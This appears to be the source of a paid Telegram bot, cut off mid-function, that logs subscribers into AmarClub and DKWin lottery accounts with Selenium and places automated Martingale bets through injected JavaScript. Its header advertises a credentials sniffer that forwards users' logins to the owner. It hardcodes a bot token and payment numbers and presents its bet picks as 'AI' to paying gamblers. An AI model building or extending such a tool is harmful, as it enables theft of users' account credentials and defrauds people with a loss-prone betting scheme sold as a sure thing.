# -*- coding: utf-8 -*-
"""
========================================================================================
   WINZY-MARTINGALE VIP TELEGRAM AUTOMATION BOT - ALL-IN-ONE MASTER ENGINE
   ----------------------------------------------------------------------
   - Automatic Dependency Installer
   - Channel Lock Redirect System (No verification wait)
   - Bilingual Flow (Bangla & English)
   - Dynamic Subscription Plans (1D, 3D, 6D, 7D, 10D, 1M)
   - Bkash & Nagad Payment Handling with TrxID Submission
   - Instant Owner Approval / Rejection Dashboard (Owner ID: 8707571669)
   - Real-time Account Credentials Sniffer & Auto-Forwarding to Owner
   - 100% Session & Profile Isolation (10-20+ Concurrent AmarClub & DKWin Accounts)
   - In-Browser Pure JS & CSS Injection Automation (WinGo 30S Martingale Engine)
========================================================================================
"""

import os
import sys
import subprocess
import time
import threading
import shutil
import json

# ==========================================
# 1. Automatic Dependency Installer
# ==========================================
REQUIRED_PACKAGES = {
    "telebot": "pyTelegramBotAPI",
    "selenium": "selenium",
}

def ensure_dependencies():
    for import_name, pkg_name in REQUIRED_PACKAGES.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[*] Missing package detected. Automatically installing '{pkg_name}'...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name])
                print(f"[+] Successfully installed '{pkg_name}'!")
            except Exception as e:
                print(f"[-] Failed to install {pkg_name}: {e}")

ensure_dependencies()

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.service import Service as FirefoxService

# ==========================================
# 2. Master System Configurations
# ==========================================
BOT_TOKEN = "8808949150:AAF236nZ7xG3kPxlxubELHqChpn4IPycFL4"
OWNER_CHAT_ID = 8707571669

CHANNEL_1 = "https://t.me/DARK67HACK"
CHANNEL_2 = "https://t.me/bdwin24_bd"

BKASH_NUMBER = "01870829343"
NAGAD_NUMBER = "01876685711"

PRICING_PLANS = {
    "1D": {"label": "1D: 500", "days": 1, "price": 500, "name": "1 Day (500 BDT)"},
    "3D": {"label": "3D: 1300", "days": 3, "price": 1300, "name": "3 Days (1,300 BDT)"},
    "6D": {"label": "6D: 2400", "days": 6, "price": 2400, "name": "6 Days (2,400 BDT)"},
    "7D": {"label": "7D: 2700", "days": 7, "price": 2700, "name": "7 Days (2,700 BDT)"},
    "10D": {"label": "10D: 3500", "days": 10, "price": 3500, "name": "10 Days (3,500 BDT)"},
    "1M": {"label": "1M: 9000", "days": 30, "price": 9000, "name": "1 Month / 30 Days (9,000 BDT)"},
}

URL_AMARCLUB_LOGIN = "https://amarclub1.com/#/login"
URL_DKWIN_LOGIN = "https://dkwin6.com/#/login"

URL_AMARCLUB_WINGO = "https://amarclub1.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
URL_DKWIN_WINGO = "https://dkwin6.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"

PROFILES_BASE_DIR = os.path.expanduser("~/.wingo_bot_isolated_profiles")
DATABASE_FILE = os.path.expanduser("~/.wingo_subscribers_db.json")
os.makedirs(PROFILES_BASE_DIR, exist_ok=True)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Global thread-safe state
user_states = {}
active_sessions = {}
db_lock = threading.Lock()
SPINNER_FRAMES = ["◴", "◷", "◶", "◵"]

# ==========================================
# 3. Persistent Subscription Storage
# ==========================================
def load_db():
    with db_lock:
        if not os.path.exists(DATABASE_FILE):
            return {"subscribers": {}, "pending_requests": {}}
        try:
            with open(DATABASE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {"subscribers": {}, "pending_requests": {}}

def save_db(data):
    with db_lock:
        try:
            with open(DATABASE_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error saving DB: {e}")

def is_user_subscribed(chat_id):
    if int(chat_id) == OWNER_CHAT_ID:
        return True, 999999
    db = load_db()
    sub_info = db.get("subscribers", {}).get(str(chat_id))
    if not sub_info:
        return False, 0
    expires_at = sub_info.get("expires_at", 0)
    now = time.time()
    if expires_at > now:
        remaining_days = max(1, int((expires_at - now) / 86400))
        return True, remaining_days
    return False, 0

# ==========================================
# 4. Mathematical Bold Font Utility
# ==========================================
def to_bold(text: str) -> str:
    res = []
    for c in str(text):
        n = ord(c)
        if 65 <= n <= 90:
            res.append(chr(n + 119743))
        elif 97 <= n <= 122:
            res.append(chr(n + 119737))
        elif 48 <= n <= 57:
            res.append(chr(n + 120764))
        else:
            res.append(c)
    return "".join(res)

def safe_delete_message(chat_id, message_id):
    if not message_id:
        return
    try:
        bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

# ==========================================
# 5. True 100% Isolated Browser Allocator
#    (Fixes the multi-user logout bug completely)
# ==========================================
def allocate_isolated_driver(session_id, target_url):
    """
    Creates an independent Firefox or Chromium process with a dedicated profile folder.
    This guarantees 100% cookie, localStorage, and token isolation so 10-20 users
    can run simultaneously without interfering or logging each other out.
    """
    profile_dir = os.path.join(PROFILES_BASE_DIR, f"prof_{session_id}_{int(time.time())}")
    os.makedirs(profile_dir, exist_ok=True)

    # Attempt Firefox first, fallback to Chromium if Firefox is not present
    try:
        options = FirefoxOptions()
        options.add_argument("--headless")
        options.add_argument("-profile")
        options.add_argument(profile_dir)
        options.set_preference("browser.cache.disk.enable", False)
        options.set_preference("browser.cache.memory.enable", True)
        options.set_preference("network.http.use-cache", False)

        service = FirefoxService(log_output=os.devnull)
        driver = webdriver.Firefox(service=service, options=options)
    except Exception:
        options = ChromeOptions()
        options.add_argument("--headless=new")
        options.add_argument(f"--user-data-dir={profile_dir}")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        driver = webdriver.Chrome(options=options)

    driver.set_window_size(390, 844)  # Mobile View (iPhone 12 frame)
    driver.get(target_url)

    sess = active_sessions.get(session_id)
    if sess:
        sess["driver"] = driver
        sess["profile_dir"] = profile_dir
        sess["window_handle"] = driver.current_window_handle
    return driver

def safe_tab_execute(sid, task_fn):
    sess = active_sessions.get(sid)
    if not sess:
        return None
    lock = sess.get("lock")
    driver = sess.get("driver")
    if not driver or not lock:
        return None
    with lock:
        try:
            return task_fn(driver)
        except Exception as e:
            print(f"[*] Execute error for {sid}: {e}")
            return None

def close_session_tab(session_id):
    sess = active_sessions.pop(session_id, None)
    if sess:
        sess["is_trading"] = False
        driver = sess.get("driver")
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        profile_dir = sess.get("profile_dir")
        if profile_dir and os.path.exists(profile_dir):
            shutil.rmtree(profile_dir, ignore_errors=True)

# ==========================================
# 6. Telegram Image Replacement Helper
# ==========================================
def display_or_replace_photo(chat_id, session_id, image_path, caption_text, reply_markup=None):
    sess = active_sessions.get(session_id, {})
    last_photo_msg_id = sess.get("live_photo_message_id")
    replaced = False

    if last_photo_msg_id and os.path.exists(image_path):
        try:
            with open(image_path, "rb") as ph:
                media = InputMediaPhoto(ph, caption=caption_text, parse_mode="HTML")
                bot.edit_message_media(
                    media=media,
                    chat_id=chat_id,
                    message_id=last_photo_msg_id,
                    reply_markup=reply_markup
                )
            replaced = True
        except Exception:
            replaced = False

    if not replaced and os.path.exists(image_path):
        try:
            with open(image_path, "rb") as ph:
                msg = bot.send_photo(
                    chat_id, ph,
                    caption=caption_text,
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
                sess["live_photo_message_id"] = msg.message_id
        except Exception as e:
            print(f"[*] Photo display error: {e}")

# ==========================================
# 7. In-Browser JavaScript Automation Code
#    (Pure JS & CSS - No HTML file needed)
# ==========================================
AUTO_FILL_AND_CLICK_JS = """
const phone = arguments[0];
const pass = arguments[1];

if (!window.location.hash.includes('login')) {
  window.location.hash = '#/login';
}

const initDialogConfirm = document.querySelector('.van-dialog__confirm, .dialog-confirm, button[class*="confirm"], .van-button--primary');
if (initDialogConfirm) {
    try { initDialogConfirm.click(); } catch(e){}
}

let elN = document.querySelector('input[type="tel"], input[placeholder*="phone" i], input[placeholder*="Phone" i]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div > div:nth-of-type(2) > input');

let elP = document.querySelector('input[type="password"]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(2) > div:nth-of-type(2) > input');

let elL = document.querySelector('button[type="submit"]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(4) > button');

if (!elN || !elP || !elL) {
  return "NOT_READY";
}

const clearAndSetVal = (el, val) => {
  el.focus();
  el.value = '';
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
  if (setter) {
    setter.call(el, val);
  } else {
    el.value = val;
  }
  el.dispatchEvent(new Event('input', { bubbles: true }));
  el.dispatchEvent(new Event('change', { bubbles: true }));
};

clearAndSetVal(elN, phone);

setTimeout(() => {
  clearAndSetVal(elP, pass);
  setTimeout(() => {
    elL.click();
  }, 700);
}, 700);

return "SUCCESS";
"""

CHECK_LOGIN_STATUS_JS = """
const hash = window.location.hash || '';
const href = window.location.href || '';
const bodyText = document.body ? document.body.innerText : '';

const dialog = document.querySelector('.van-dialog');
if (dialog) {
    const dText = dialog.innerText || '';
    if (dText.includes('already logged in') || dText.includes('somewhere else') || 
        dText.includes('logged in') || dText.includes('22') || dText.includes('other device') ||
        dText.includes('Confirm') || dText.includes('Determine') || dText.includes('continue')) {
        const confirmBtn = dialog.querySelector('.van-dialog__confirm, button[class*="confirm"], .van-button--danger, .van-button--primary, button');
        if (confirmBtn) {
            try { confirmBtn.click(); } catch(e){}
            return { status: "CONFIRM_CLICKED", message: "Auto-confirmed multi-device prompt" };
        }
    }
}

const isBonusModal = bodyText.includes('BONUS DAILY RECHARGE') || 
                     bodyText.includes('DAILY RECHARGE') || 
                     bodyText.includes('Daily Bonus') ||
                     bodyText.includes('Deposit Bonus') ||
                     bodyText.includes('Announcement');

if (isBonusModal) {
    const confirmBtn = document.querySelector('.van-dialog__confirm, .dialog-confirm, button[class*="confirm"], button[class*="close"], .van-popup__close-icon');
    if (confirmBtn) {
        try { confirmBtn.click(); } catch(e){}
    }
    return { status: "SUCCESS" };
}

try {
    const t1 = localStorage.getItem('token') || localStorage.getItem('token_str') || localStorage.getItem('auth');
    const t2 = sessionStorage.getItem('token') || sessionStorage.getItem('auth');
    if (t1 || t2) {
        return { status: "SUCCESS" };
    }
} catch(e){}

if (!href.includes('/login') && (!hash.includes('login') || hash.length > 8)) {
    return { status: "SUCCESS" };
}

const toast = document.querySelector('.van-toast--text, .van-toast--fail, .van-toast');
if (toast && toast.innerText && toast.innerText.trim().length > 0) {
    const t = toast.innerText.trim();
    if (t.includes('already logged in') || t.includes('somewhere else') || t.includes('22')) {
        const loginBtn = document.querySelector('button[type="submit"], body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(4) > button');
        if (loginBtn) {
            try { loginBtn.click(); } catch(e){}
        }
        return { status: "PENDING", message: "Handling session takeover..." };
    }
    if (t.includes('password') || t.includes('incorrect') || t.includes('wrong') || t.includes('Account does not exist') || t.includes('frozen')) {
        return { status: "ERROR", message: t };
    }
}

return { status: "PENDING" };
"""

WINGO_RUNBOX_AND_CLICK_JS = """
(function(){
    if (!document.getElementById('_run_box')) {
        let d = [{"name": "Wingo", "sel": "body > div > div:nth-of-type(3) > div:nth-of-type(5) > div:nth-of-type(2) > div:nth-of-type(3) > div > div > div > img"}],
            b = document.createElement('div');
        b.id = '_run_box';
        b.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#18181b;padding:6px 10px;border-radius:30px;display:flex;gap:6px;align-items:center;z-index:99999999;box-shadow:0 6px 16px rgba(0,0,0,0.3);font:12px sans-serif;';
        
        let all = document.createElement('button');
        all.innerText = '▶ All';
        all.style.cssText = 'background:#f59e0b;color:#000;border:none;padding:4px 8px;border-radius:20px;cursor:pointer;font-weight:bold;font-size:11px;';
        all.onclick = () => {
            d.forEach((x, i) => {
                setTimeout(() => {
                    let el = document.querySelector(x.sel);
                    if (el) el.click();
                }, i * 400);
            });
        };
        b.appendChild(all);

        d.forEach(x => {
            let btn = document.createElement('button');
            btn.innerText = x.name;
            btn.style.cssText = 'background:#22c55e;color:#000;border:none;padding:4px 8px;border-radius:20px;cursor:pointer;font-weight:bold;font-size:11px;';
            btn.onclick = () => {
                let el = document.querySelector(x.sel);
                if (el) el.click();
            };
            b.appendChild(btn);
        });

        let x = document.createElement('span');
        x.innerText = '✕';
        x.style.cssText = 'cursor:pointer;color:#a1a1aa;margin-left:4px;font-weight:bold;';
        x.onclick = () => b.remove();
        b.appendChild(x);
        document.body.appendChild(b);
    }

    let target = document.querySelector("body > div > div:nth-of-type(3) > div:nth-of-type(5) > div:nth-of-type(2) > div:nth-of-type(3) > div > div > div > img");
    if (target) {
        target.click();
        return "CLICKED_SELECTOR";
    }
    let alt = document.querySelector("div[class*='wingo' i], img[src*='wingo' i]");
    if (alt) {
        alt.click();
        return "CLICKED_ALT";
    }
    return "INJECTED_WAITING";
})();
"""

CHECK_WINGO_READY_JS = """
const hash = window.location.hash || '';
const href = window.location.href || '';
const bodyText = document.body ? document.body.innerText : '';

const dismissBtns = document.querySelectorAll('.van-dialog__confirm, .dialog-close, .van-popup__close-icon, button[class*="close"], .van-dialog button');
dismissBtns.forEach(btn => { try { btn.click(); } catch(e){} });

if (hash.includes('WinGo') || href.includes('WinGo') || bodyText.includes('Win Go') || bodyText.includes('30S') || bodyText.includes('Time remaining')) {
    return true;
}
return false;
"""

FETCH_BALANCE_JS = """
let els = document.querySelectorAll('*');
for (let i = 0; i < els.length; i++) {
    let txt = els[i].innerText || '';
    if (txt.includes('Wallet balance') || txt.includes('Balance')) {
        let parentTxt = (els[i].parentNode && els[i].parentNode.innerText) ? els[i].parentNode.innerText : '';
        let match = parentTxt.match(/[৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
        if (match) return parseFloat(match[1].replace(/,/g, ''));
    }
}
for (let i = 0; i < els.length; i++) {
    let txt = els[i].innerText || '';
    if (txt.trim().match(/^[৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)) {
        return parseFloat(txt.replace(/[^\\d.]/g, ''));
    }
}
return 0;
"""

WINGO_CORE_JS = """
const autoTargetProfit = arguments[0];
const autoTotalSteps = arguments[1];

(function(){
    if(document.getElementById('sys-core-fin')) {
        let tIn = document.querySelector('#sys-core-fin input[placeholder*="TARGET"]');
        let sIn = document.querySelector('#sys-core-fin input[placeholder*="STEPS"]');
        let btn = document.querySelector('#sys-core-fin button');
        if (tIn && sIn && btn) {
            tIn.value = autoTargetProfit;
            sIn.value = autoTotalSteps;
            btn.click();
        }
        return "ALREADY_EXISTS_RESTARTED";
    }

    const uF=s=>String(s).toUpperCase().split('').map(c=>{
        let n=c.charCodeAt(0);
        if(n>=65&&n<=90)return String.fromCodePoint(n+119743);
        if(n>=48&&n<=57)return String.fromCodePoint(n+120764);
        return c;
    }).join('');

    const cfg={fRt:300,syncDly:2500,minSf:10};
    let st={
        isRun:false,
        startBal:0,
        tgtAmt:0,
        curBal:0,
        autoInt:null,
        preScn:null,
        isTrd:false,
        stpIdx:0,
        dynSeq:[],
        totalSteps:autoTotalSteps || 7,
        tradesDone:0,
        lastPred:null,
        lastPeriod:null,
        balanceCheckInterval:null,
        manualOverrideBet:null,
        w:0,
        l:0,
        cur_w_streak:0,
        cur_l_streak:0,
        max_w_streak:0,
        max_l_streak:0
    };

    window.__WINGO_ST = st;

    let curApiIdx=0,isFetchingApi=false;
    const VoiceEngine={
        speak(msg,lang='en-US',rate=1.1){
            if(!('speechSynthesis' in window))return;
            try{
                window.speechSynthesis.cancel();
                let utter=new SpeechSynthesisUtterance(msg);
                utter.lang=lang;
                utter.rate=rate;
                utter.pitch=1.2;
                utter.volume=1;
                window.speechSynthesis.speak(utter);
            }catch(e){}
        }
    };

    let dTimeLeft=30;
    setInterval(()=>{
        let uClk=document.getElementById('ui-clk');
        if(uClk){
            let minutes=Math.floor(dTimeLeft/60),seconds=dTimeLeft%60;
            uClk.textContent=uF(String(minutes).padStart(2,'0') + ':' + String(seconds).padStart(2,'0'));
        }
        dTimeLeft--;
        if(dTimeLeft<0)dTimeLeft=30;
    },1000);

    let lkOvl=document.createElement('div');
    lkOvl.id='drx-lck-bg';
    lkOvl.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.01);z-index:9999997;display:none;';
    lkOvl.addEventListener('click',e=>{e.preventDefault();e.stopPropagation();},true);
    document.body.appendChild(lkOvl);

    function chkBal(){
        let els=document.querySelectorAll('*');
        for(let i=0;i<els.length;i++){
            let txt=els[i].innerText||'';
            if(txt.includes('Wallet balance')||txt.includes('Balance')){
                let parentTxt=(els[i].parentNode&&els[i].parentNode.innerText)?els[i].parentNode.innerText:'';
                let match=parentTxt.match(/[৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
                if(match){
                    st.curBal=parseFloat(match[1].replace(/,/g,''));
                    return st.curBal;
                }
            }
        }
        for(let i=0;i<els.length;i++){
            let txt=els[i].innerText||'';
            if(txt.trim().match(/^[৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)){
                st.curBal=parseFloat(txt.replace(/[^\\d.]/g,''));
                return st.curBal;
            }
        }
        return st.curBal;
    }

    function generateSmartSequence(balance,steps){
        steps=Math.max(1,parseInt(steps)||1);
        let b=Math.max(1,Math.floor(balance)||1);
        let units=Math.pow(2,steps)-1;
        if(units>0&&units<=b){
            let base=Math.floor(b/units);
            let seq=[],val=Math.max(1,base);
            for(let i=0;i<steps;i++){
                seq.push(val);
                val*=2;
            }
            return seq;
        }
        let seq=[],val=1,sum=0;
        for(let i=0;i<steps;i++){
            if(sum+val<=b){
                seq.push(val);
                sum+=val;
                val*=2;
            }else{
                let rem=b-sum;
                if(rem>0)seq.push(rem);
                break;
            }
        }
        return seq.length>0?seq:[1];
    }

    let p=document.createElement('div');
    p.id='sys-core-fin';
    p.style.cssText='position:fixed;width:170px;padding:4px;font-family:monospace;font-size:10px;z-index:9999999;color:#fff;user-select:none;border-radius:14px;overflow:visible;background:transparent;';
    let sL=localStorage.getItem('drx_ui_x'),sT=localStorage.getItem('drx_ui_y');
    if(sL&&sT){p.style.left=sL;p.style.top=sT;}else{p.style.top='20px';p.style.right='20px';}

    let stl=document.createElement('style');
    stl.innerHTML='@keyframes titlePulseAnim{0%{transform:scale(1);text-shadow:0 0 10px #00ff00;}50%{transform:scale(1.05);text-shadow:0 0 20px #00ff00,0 0 30px #fff;}100%{transform:scale(1);text-shadow:0 0 10px #00ff00;}}.drx-in{background:rgba(10,12,18,0.92);backdrop-filter:blur(6px);position:relative;overflow:visible;z-index:1;display:flex;flex-direction:column;height:100%;border-radius:12px;border:2px solid #00ff00;box-sizing:border-box;}input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}.txt-blk{color:#fff;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-accent{color:#00ff00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-warn{color:#ffcc00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-err{color:#f00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-cyan{color:#0ff;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-mag{color:#f0f;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.drx-elec-target{border-radius:8px!important;position:relative;z-index:9999!important;transition:all 0.1s;background:rgba(0,0,0,0.5)!important;border:2px solid #00ff00!important;}.drx-title-anim{display:inline-block;animation:titlePulseAnim 2s infinite ease-in-out;}';
    document.body.appendChild(stl);
    p.className='drx-wrap';

    let inC=document.createElement('div');
    inC.className='drx-in';
    let h=document.createElement('div');
    h.style.cssText='padding:8px;font-size:12px;display:flex;justify-content:space-between;cursor:move;border-bottom:2px solid #000;background:transparent;';
    h.innerHTML='<span class="txt-blk drx-title-anim" id="drx-title">' + uF('WINZY-MARTINGALE') + '</span><span style="cursor:pointer;" class="txt-blk-err" id="sys-cls">X</span>';
    inC.appendChild(h);

    let drg=false,sx,sy,sl,st_y;
    function dSt(e){
        if(e.target.tagName==='SPAN'&&e.target.id==='sys-cls')return;
        drg=true;
        let ev=e.type.includes('touch')?e.touches[0]:e;
        sx=ev.clientX;sy=ev.clientY;
        sl=p.offsetLeft;st_y=p.offsetTop;
    }
    function dMv(e){
        if(!drg)return;
        e.preventDefault();
        let ev=e.type.includes('touch')?e.touches[0]:e;
        p.style.left=(sl+ev.clientX-sx)+'px';
        p.style.top=(st_y+ev.clientY-sy)+'px';
    }
    function dEn(){
        drg=false;
        localStorage.setItem('drx_ui_x',p.style.left);
        localStorage.setItem('drx_ui_y',p.style.top);
    }
    h.addEventListener('mousedown',dSt);
    document.addEventListener('mousemove',dMv);
    document.addEventListener('mouseup',dEn);

    h.querySelector('#sys-cls').onclick=()=>{
        clearInterval(st.autoInt);
        clearInterval(st.preScn);
        if(st.balanceCheckInterval)clearInterval(st.balanceCheckInterval);
        p.remove();
        lkOvl.remove();
        document.body.style.overflow='';
    };

    let b=document.createElement('div');
    b.style.cssText='padding:10px;display:flex;flex-direction:column;gap:8px;background:transparent;';

    const p1=document.createElement('div');
    p1.innerHTML='<div style="text-align:center;margin-bottom:8px;padding:6px;background:transparent;border-radius:6px;border:2px solid #000;"><span class="txt-blk" style="font-size:9px;color:#ccc;">' + uF('CURRENT BAL') + '</span><br><span id="pre-bal" class="txt-blk" style="font-size:15px;color:#fff;">--</span></div>';

    const tgtInp=document.createElement('input');
    tgtInp.type='number';
    tgtInp.value=autoTargetProfit || '';
    tgtInp.placeholder='TARGET PROFIT (৳)';
    tgtInp.className='txt-blk';
    tgtInp.style.cssText='width:100%;box-sizing:border-box;padding:8px;margin-bottom:8px;background:transparent;border:2px solid #000;border-radius:4px;text-align:center;font-size:11px;outline:none;color:#fff;';

    const stepInp=document.createElement('input');
    stepInp.type='number';
    stepInp.value=autoTotalSteps || 7;
    stepInp.placeholder='TOTAL STEPS (e.g. 7)';
    stepInp.className='txt-blk-cyan';
    stepInp.style.cssText='width:100%;box-sizing:border-box;padding:8px;margin-bottom:8px;background:transparent;border:2px solid #000;border-radius:4px;text-align:center;font-size:11px;outline:none;color:#0ff;';

    const goBtn=document.createElement('button');
    goBtn.innerText=uF('START');
    goBtn.className='txt-blk-accent';
    goBtn.style.cssText='width:100%;box-sizing:border-box;padding:8px;background:transparent;border:2px solid #000;border-radius:4px;cursor:pointer;font-size:11px;font-weight:bold;transition:0.2s;';

    p1.appendChild(tgtInp);
    p1.appendChild(stepInp);
    p1.appendChild(goBtn);

    st.preScn=setInterval(()=>{
        if(!st.isRun){
            let bal=chkBal();
            let el=document.getElementById('pre-bal');
            if(el)el.innerText=uF(bal>0?bal.toFixed(2):'--');
        }
    },1000);

    const p2=document.createElement('div');
    p2.style.display='none';

    const balBx=document.createElement('div');
    balBx.style.cssText='padding:6px;text-align:center;background:transparent;border-radius:6px;border:2px solid #000;margin-bottom:6px;';
    balBx.innerHTML='<div class="txt-blk" style="font-size:9px;color:#ccc;">' + uF('LIVE BAL / PROFIT') + '</div><div id="ui-bal" class="txt-blk" style="font-size:16px;color:#fff;">--</div>';

    let aiRow='<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('AI:') + '</span><span id="ui-ai" class="txt-blk-cyan">VIP JSON API</span></div>';
    const infBx=document.createElement('div');
    infBx.style.cssText='padding:6px;font-size:10px;line-height:2;background:transparent;border-radius:6px;border:2px solid #000;position:relative;overflow:hidden;';
    infBx.innerHTML=aiRow+'<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('TGT:') + '</span><span id="ui-tgt" class="txt-blk" style="color:#fff;">0</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('STP:') + '</span><span id="ui-bet" class="txt-blk-warn" style="color:#ffcc00;cursor:pointer;">5</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('CLK:') + '</span><span id="ui-clk" class="txt-blk" style="color:#fff;">00:30</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('STS:') + '</span><span id="ui-sts" class="txt-blk" style="color:#fff;">' + uF('WAIT') + '</span></div>';

    const ghBox=document.createElement('div');
    ghBox.id='gh-box-wrap';
    ghBox.style.cssText='width:100%;height:26px;background:transparent;border:2px solid #000;border-radius:4px;padding:2px 4px;margin-top:4px;box-sizing:border-box;overflow:hidden;display:flex;flex-direction:column;justify-content:center;';
    ghBox.innerHTML='<div id="gh-content" class="txt-blk" style="font-size:7.5px;line-height:1.2;color:#fff;white-space:pre-wrap;text-align:left;width:100%;">Syncing API...</div>';
    infBx.appendChild(ghBox);

    const stpBtn=document.createElement('button');
    stpBtn.innerText=uF('STOP');
    stpBtn.className='txt-blk-err';
    stpBtn.style.cssText='width:100%;padding:8px;background:transparent;border:2px solid #000;border-radius:4px;cursor:pointer;font-size:11px;margin-top:6px;transition:0.2s;';

    p2.appendChild(balBx);
    p2.appendChild(infBx);
    p2.appendChild(stpBtn);

    b.appendChild(p1);
    b.appendChild(p2);
    inC.appendChild(b);
    p.appendChild(inC);
    document.body.appendChild(p);

    const drx_triggerEvent=(el,etype)=>{
        let ev=new Event(etype,{bubbles:true,cancelable:true});
        el.dispatchEvent(ev);
    };

    const drx_simClick=el=>{
        if(!el)return;
        ['pointerdown','mousedown','touchstart','pointerup','mouseup','touchend','click'].forEach(evt=>{
            try{
                el.dispatchEvent(new MouseEvent(evt,{bubbles:true,cancelable:true,view:window}));
            }catch(e){}
        });
    };

    const exeTrd=(pred,amt,cb)=>{
        try{
            let btn=null,targetText=pred.toLowerCase(),btns=document.querySelectorAll('button, div, span');
            for(let i=0;i<btns.length;i++){
                let t=(btns[i].innerText||'').trim().toLowerCase();
                if(t===targetText&&btns[i].offsetParent&&!btns[i].children.length){
                    btn=btns[i];
                    break;
                }
            }
            if(!btn){
                if(targetText==='big')btn=document.querySelector('.Betting__C-foot-b');
                else if(targetText==='small')btn=document.querySelector('.Betting__C-foot-s');
                else if(targetText==='green')btn=document.querySelector('button[class*="green"], div[class*="green"]');
                else if(targetText==='red')btn=document.querySelector('button[class*="red"], div[class*="red"]');
                else if(targetText==='violet')btn=document.querySelector('button[class*="violet"], div[class*="violet"]');
            }
            if(!btn){
                if(cb)cb(false);
                return;
            }
            btn.classList.add('drx-elec-target');
            drx_simClick(btn);

            let checkAttempts=0,valInterval=setInterval(()=>{
                checkAttempts++;
                let inpEl=document.querySelector("input[type='number'], input.van-field__control");
                if(inpEl||checkAttempts>15){
                    clearInterval(valInterval);
                    if(inpEl){
                        inpEl.focus();
                        let setV=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,"value").set;
                        if(setV)setV.call(inpEl,String(amt));
                        else inpEl.value=amt;
                        drx_triggerEvent(inpEl,'input');
                        drx_triggerEvent(inpEl,'change');
                        drx_triggerEvent(inpEl,'blur');
                    }
                    setTimeout(()=>{
                        let dEl=document.querySelector('button.bet-amount, button[class*="bet-amount"]');
                        if(dEl){
                            drx_simClick(dEl);
                        }else{
                            document.querySelectorAll('button').forEach(b=>{
                                if((b.innerText||'').includes('Total amount')&&b.offsetParent)drx_simClick(b);
                            });
                        }
                        btn.classList.remove('drx-elec-target');
                        setTimeout(()=>{if(cb)cb(true);},2000);
                    },800);
                }
            },200);
        }catch(e){
            if(cb)cb(false);
        }
    };

    const scnUI=cb=>{
        let ov=document.createElement('div');
        ov.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:transparent;z-index:9999998;pointer-events:none;overflow:hidden;';
        let cBase='#00ff00',rL=document.createElement('div');
        rL.style.cssText='position:absolute;width:100%;height:2px;background:' + cBase + ';box-shadow:0 0 10px 3px ' + cBase + ';animation:sR 0.6s linear infinite alternate;';
        let gL=document.createElement('div');
        gL.style.cssText='position:absolute;height:100%;width:3px;background:' + cBase + ';box-shadow:0 0 15px 5px ' + cBase + ';animation:sG 0.6s cubic-bezier(0.25,0.1,0.25,1) infinite alternate;';
        let sS=document.createElement('style');
        sS.innerHTML='@keyframes sR{0%{top:-10px;}100%{top:100vh;}}@keyframes sG{0%{left:-10px;}100%{left:100vw;}}';
        document.head.appendChild(sS);
        ov.appendChild(rL);
        ov.appendChild(gL);
        document.body.appendChild(ov);
        setTimeout(()=>{
            ov.remove();
            sS.remove();
            if(cb)cb();
        },1500);
    };

    const getNextLivePeriod=str=>{
        let chars=str.split('');
        for(let i=chars.length-1;i>=0;i--){
            if(chars[i]!=='9'){
